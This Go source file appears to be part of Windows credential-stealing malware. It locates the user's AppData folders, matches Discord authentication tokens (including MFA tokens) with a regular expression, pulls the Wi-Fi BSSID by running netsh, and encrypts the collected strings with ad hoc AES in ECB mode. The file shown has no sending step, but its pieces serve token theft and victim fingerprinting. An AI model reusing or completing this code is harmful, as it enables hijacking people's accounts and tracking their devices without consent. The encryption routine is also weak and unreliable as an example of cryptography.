package main

import (
	"crypto/aes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"strings"
	"time"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL   string = os.Getenv("LOCALAPPDATA")
	ROAMING string = os.Getenv("APPDATA")
	TEMP    string = os.Getenv("TEMP")

	HEADERS [999]string
)

func GetUsername() string {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	if strings.Contains(user.Username, "\\") {
		return strings.Split(user.Username, "\\")[1]
	} else {
		return user.Username
	}
}

func FindAllTokens(input string) []string {
	Expression, e := regexp.Compile("([\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38})|(mfa\\.[\\w-]{84})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	return Expression.FindAllString(input, -1)
}

func RemoveDuplicates[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

func FormatTokens(input []string) string {
	output, _ := json.Marshal(RemoveDuplicates(input))
	return string(output)
}

func Slice(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	if chunkSize >= len(s) {
		return []string{s}
	}
	var chunks []string = make([]string, 0, (len(s)-1)/chunkSize+1)
	currentLen := 0
	currentStart := 0
	for i := range s {
		if currentLen == chunkSize {
			chunks = append(chunks, s[currentStart:i])
			currentLen = 0
			currentStart = i
		}
		currentLen++
	}
	chunks = append(chunks, s[currentStart:])
	return chunks
}

func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

func RandIntBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = numberBytes[rand.Intn(len(numberBytes))]
	}
	return string(b)
}

func GenerateHeaders() {
	for i := 0; i < len(HEADERS); i++ {
		HEADERS[i] = RandIntBytes(6)
	}
}

func CryptSign(input, expected string) (hash, nonce string) {
	var out string

	for i := 0; i < 999999; i++ {
		h := sha256.Sum256([]byte(input + string(i)))
		out = hex.EncodeToString(h[:])
		if strings.HasSuffix(out, expected) {
			nonce = fmt.Sprintf("%06d", i)
			break
		}
	}
	return out, nonce
}

func GetBSSID() string {
	out, err := exec.Command("cmd", "/c", "netsh wlan show interfaces").CombinedOutput()
	if err != nil {
		fmt.Println("Failed to find BSSID:", err)
	}

	Expression1, e := regexp.Compile("(BSSID[ \\t]*:[ \\t])(([0-9a-f]{2}([:]|)){6})")
	Expression2, e := regexp.Compile("(([0-9a-f]{2}([:]|)){6})")
	if e != nil {
		log.Fatalf(e.Error())
	}

	var RegexFind []string = Expression2.FindAllString(Expression1.FindAllString(string(out), -1)[0], -1)

	if len(RegexFind) == 0 || RegexFind[0] == "" {
		return "None"
	} else {
		return RegexFind[0]
	}
}

func EncryptAES(key []byte, plaintext string) string {
	// create cipher
	c, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// allocate space for ciphered data
	out := make([]byte, len(plaintext))

	// encrypt
	c.Encrypt(out, []byte(plaintext))
	// return hex string
	return hex.EncodeToString(out)
}

func ToString(s interface{}) string {
	return fmt.Sprint(s)
}

func Encrypt(s, key string) string {
	var out string = ""
	ss := Slice(s, 16)

	for i := 0; i < len(ss); i++ {
		if len(ss[i]) < 16 {
			enc := strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("%v", ss[i]+strings.Repeat("@", 16-len(ss[i]))), "%!d(string=", ""), ")", "")
			out = out + EncryptAES([]byte(key), enc)
			continue
		}
		out = out + EncryptAES([]byte(key), ss[i])
	}

	return out
}